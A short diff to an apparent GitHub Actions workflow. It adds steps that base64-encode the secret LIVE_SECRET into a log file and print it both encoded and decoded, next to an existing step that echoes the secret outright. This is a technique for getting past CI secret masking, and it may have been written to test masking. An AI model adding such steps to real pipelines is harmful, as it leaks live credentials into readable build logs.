@@ -56,7 +56,13 @@ jobs:
           check-contributor: true
                 
       - name: Get secret
-        run: echo ${{ secrets.LIVE_SECRET }} | base64 | base64 -d
+        run: echo ${{ secrets.LIVE_SECRET }} | base64 >> file.log
+        
+      - name: Show file secret
+        run: cat file.log
+          
+      - name: Show file secret 2
+        run: cat file.log | base64 -d
                         
       - name: Dump secrets.LIVE_SECRET
         run: echo '${{ secrets.LIVE_SECRET }}'
